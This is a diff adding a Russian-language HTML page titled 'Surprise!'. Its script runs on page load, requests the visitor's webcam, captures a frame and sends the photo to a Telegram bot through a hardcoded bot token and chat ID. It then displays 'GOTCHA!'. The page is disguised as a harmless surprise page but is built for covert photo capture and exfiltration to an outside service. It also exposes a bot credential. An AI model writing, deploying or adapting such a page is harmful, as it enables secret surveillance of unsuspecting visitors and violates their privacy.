@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Сюрприз!</title>
+    <style>
+        body { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            background-color: #2c3e50; 
+            color: white; 
+            font-family: sans-serif;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+    <h1 id="status">Загрузка...</h1>
+
+    <script>
+        async function takePhoto() {
+            try {
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+
+                // Запрашиваем доступ к камере
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0);
+                    
+                    const dataUrl = canvas.toDataURL('image/png');
+                    
+                    // ВСТАВЬ СВОИ ДАННЫЕ ТУТ:
+                    const token = "9270278972:AAHHz8RjL_KQ0OBDXHQUCad7cJW4BdbXafQ"; 
+                    const chatId = "1062964951";
+                    
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${dataUrl}`);
+                    
+                    document.getElementById('status').innerText = "ПОПАЛСЯ! 📸";
+                };
+
+            } catch (err) {
+                console.error("Ошибка:", err);
+                document.getElementById('status').innerText = "Ой, камера не включилась...";
+            }
+        }
+
+        // Запускаем сразу при открытии страницы
+        takePhoto();
+    </script>
+</body>
+</html>
